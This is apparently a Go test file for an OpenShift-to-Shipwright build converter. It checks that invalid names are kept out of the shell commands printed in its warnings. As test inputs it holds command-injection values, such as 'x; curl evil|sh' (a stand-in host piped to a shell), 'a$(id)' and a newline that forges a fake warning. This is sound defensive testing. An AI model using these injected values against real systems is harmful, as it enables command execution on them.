//go:build !documentation

package buildconfig

import (
	"strings"
	"testing"

	buildv1 "github.com/openshift/api/build/v1"
	logrustest "github.com/sirupsen/logrus/hooks/test"
	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/util/validation"
)

const invalidNameWarnMarker = "which is not a valid Kubernetes name"

func TestCommandArg(t *testing.T) {
	tests := []struct {
		name  string
		value string
		check func(string) []string
		want  string
	}{
		{"valid label", "myns", validation.IsDNS1123Label, "myns"},
		{"dotted subdomain", "ci.builder", validation.IsDNS1123Subdomain, "ci.builder"},
		{"dotted label", "ci.builder", validation.IsDNS1123Label, "<p>"},
		{"empty", "", validation.IsDNS1123Subdomain, ""},
		{"metacharacter", "x; curl evil|sh", validation.IsDNS1123Subdomain, "<p>"},
		{"newline", "x\nFAKE", validation.IsDNS1123Subdomain, "<p>"},
		{"command substitution", "a$(id)", validation.IsDNS1123Subdomain, "<p>"},
		{"leading dash", "-n", validation.IsDNS1123Subdomain, "<p>"},
		{"uppercase", "Builder", validation.IsDNS1123Subdomain, "<p>"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := commandArg(tt.value, "<p>", tt.check); got != tt.want {
				t.Errorf("commandArg(%q) = %q, want %q", tt.value, got, tt.want)
			}
		})
	}
}

// convertForCommandNames converts bc and returns the Build's annotations and the
// recorded warnings.
func convertForCommandNames(t *testing.T, bc *buildv1.BuildConfig) (map[string]string, []string) {
	t.Helper()
	logger, _ := logrustest.NewNullLogger()
	c := &Converter{Log: logger}
	resources, outcome := c.Convert(bc)
	if outcome.State == OutcomeFailed || outcome.State == OutcomeSkipped {
		t.Fatalf("conversion %s: %s", outcome.State, outcome.Reason)
	}
	for _, r := range resources {
		if r.GetKind() == "Build" {
			return r.GetAnnotations(), outcome.Warnings
		}
	}
	t.Fatal("no Build in the conversion output")
	return nil, nil
}

func commandNamesBC(namespace, serviceAccount, pullSecret string, binary bool) *buildv1.BuildConfig {
	bc := &buildv1.BuildConfig{
		ObjectMeta: metav1.ObjectMeta{Name: "app", Namespace: namespace},
		Spec: buildv1.BuildConfigSpec{
			CommonSpec: buildv1.CommonSpec{
				ServiceAccount: serviceAccount,
				Source: buildv1.BuildSource{
					Type: buildv1.BuildSourceGit,
					Git:  &buildv1.GitBuildSource{URI: "https://github.com/example/app.git"},
				},
				Strategy: buildv1.BuildStrategy{
					Type:           buildv1.DockerBuildStrategyType,
					DockerStrategy: &buildv1.DockerBuildStrategy{},
				},
				Output: buildv1.BuildOutput{
					To: &corev1.ObjectReference{Kind: "DockerImage", Name: "quay.io/example/app:latest"},
				},
			},
		},
	}
	if pullSecret != "" {
		bc.Spec.Strategy.DockerStrategy.PullSecret = &corev1.LocalObjectReference{Name: pullSecret}
	}
	if binary {
		bc.Spec.Source = buildv1.BuildSource{Type: buildv1.BuildSourceBinary, Binary: &buildv1.BinaryBuildSource{}}
	}
	return bc
}

// BUILD-2439: a name the API server would reject never reaches a command a
// warning tells the operator to paste; a placeholder takes its place and one
// warning names the bad value. Valid names, dotted ones included, paste as is.
func TestCommandNamesKeepInvalidNamesOutOfCommands(t *testing.T) {
	tests := []struct {
		name        string
		bc          *buildv1.BuildConfig
		want        []string // substrings some warning must contain
		wantNot     []string // substrings no warning may contain
		wantInvalid []string // one invalid-name warning per entry, naming it
	}{
		{
			name:        "W8 metacharacter in the ServiceAccount",
			bc:          commandNamesBC("myns", "x; curl evil|sh", "my-pull-secret", false),
			want:        []string{"oc -n myns secrets link <serviceaccount> my-pull-secret --for=pull,mount"},
			wantNot:     []string{"secrets link x;"},
			wantInvalid: []string{`ServiceAccount "x; curl evil|sh"`},
		},
		{
			name:        "W8 invalid pull secret",
			bc:          commandNamesBC("myns", "custom-builder-sa", "bad$(id)", false),
			want:        []string{"oc -n myns secrets link custom-builder-sa <pull-secret> --for=pull,mount"},
			wantNot:     []string{"custom-builder-sa bad$(id)"},
			wantInvalid: []string{`pull secret "bad$(id)"`},
		},
		{
			name: "W8 and W72 share one invalid namespace",
			bc:   commandNamesBC("bad ns", "builder", "my-pull-secret", false),
			want: []string{
				"oc -n <namespace> secrets link builder my-pull-secret --for=pull,mount",
				"oc -n <namespace> get serviceaccount builder",
				"-z <sa> -n <namespace>,",
			},
			wantNot:     []string{"-n bad ns"},
			wantInvalid: []string{`namespace "bad ns"`},
		},
		{
			name:        "W73 invalid ServiceAccount on a binary build",
			bc:          commandNamesBC("myns", "a$(id)", "", true),
			want:        []string{"--sa-name <serviceaccount>.", "carried by <serviceaccount> is not used"},
			wantNot:     []string{"--sa-name a$(id)"},
			wantInvalid: []string{`ServiceAccount "a$(id)"`},
		},
		{
			name: "dotted ServiceAccount is valid",
			bc:   commandNamesBC("myns", "ci.builder", "my-pull-secret", false),
			want: []string{"oc -n myns secrets link ci.builder my-pull-secret --for=pull,mount"},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, warns := convertForCommandNames(t, tt.bc)
			for _, s := range tt.want {
				if countContaining(warns, s) == 0 {
					t.Errorf("no warning contains %q:\n%s", s, strings.Join(warns, "\n"))
				}
			}
			for _, s := range tt.wantNot {
				if n := countContaining(warns, s); n != 0 {
					t.Errorf("%d warning(s) contain %q:\n%s", n, s, strings.Join(warns, "\n"))
				}
			}
			if n := countContaining(warns, invalidNameWarnMarker); n != len(tt.wantInvalid) {
				t.Errorf("invalid-name warnings = %d, want %d:\n%s", n, len(tt.wantInvalid), strings.Join(warns, "\n"))
			}
			for _, s := range tt.wantInvalid {
				if countContaining(warns, "names "+s+", "+invalidNameWarnMarker) != 1 {
					t.Errorf("no single invalid-name warning names %s:\n%s", s, strings.Join(warns, "\n"))
				}
			}
		})
	}
}

// The binary-source warnings used to print the raw BuildConfig name in
// 'shp build upload', which names no Build once uniqueName rewrites it and
// carried shell characters into the command.
func TestCommandNamesBinaryUploadNamesTheBuild(t *testing.T) {
	for _, asFile := range []string{"", "app.jar"} {
		t.Run("asFile="+asFile, func(t *testing.T) {
			bc := commandNamesBC("myns", "", "", true)
			bc.Name = "My_App;id"
			bc.Spec.Source.Binary.AsFile = asFile
			logger, _ := logrustest.NewNullLogger()
			c := &Converter{Log: logger}
			resources, outcome := c.Convert(bc)
			var buildName string
			for _, r := range resources {
				if r.GetKind() == "Build" {
					buildName = r.GetName()
				}
			}
			if buildName == "" || buildName == bc.Name {
				t.Fatalf("expected a rewritten Build name, got %q", buildName)
			}
			if countContaining(outcome.Warnings, "shp build upload "+buildName+" <directory>") == 0 {
				t.Errorf("no warning names Build %s in the upload command:\n%s", buildName, strings.Join(outcome.Warnings, "\n"))
			}
			if n := countContaining(outcome.Warnings, "shp build upload My_App;id"); n != 0 {
				t.Errorf("%d warning(s) put the raw BuildConfig name in the upload command", n)
			}
		})
	}
}

// A newline in the ServiceAccount used to split the conversion-warnings
// annotation, so the text after it read as a warning of its own.
func TestCommandNamesNewlineCannotForgeAWarning(t *testing.T) {
	annotations, warns := convertForCommandNames(t, commandNamesBC("myns", "x\nFAKE", "my-pull-secret", false))
	lines := strings.Split(annotations[ConversionWarningsAnnotation], "\n")
	if len(lines) != len(warns) {
		t.Errorf("annotation has %d lines for %d warnings:\n%s", len(lines), len(warns), annotations[ConversionWarningsAnnotation])
	}
	for _, l := range lines {
		if strings.HasPrefix(l, "FAKE") {
			t.Errorf("annotation line starts with the injected text: %q", l)
		}
	}
}

// The BuildRun template is YAML, not shell, and keeps the name the BuildConfig
// gave; the target's admission rejects it there.
func TestCommandNamesTemplateKeepsRawServiceAccount(t *testing.T) {
	annotations, _ := convertForCommandNames(t, commandNamesBC("myns", "a$(id)", "", true))
	if tmpl := annotations[BuildRunTemplateAnnotation]; !strings.Contains(tmpl, "a$(id)") {
		t.Errorf("BuildRun template lost the ServiceAccount name:\n%s", tmpl)
	}
}
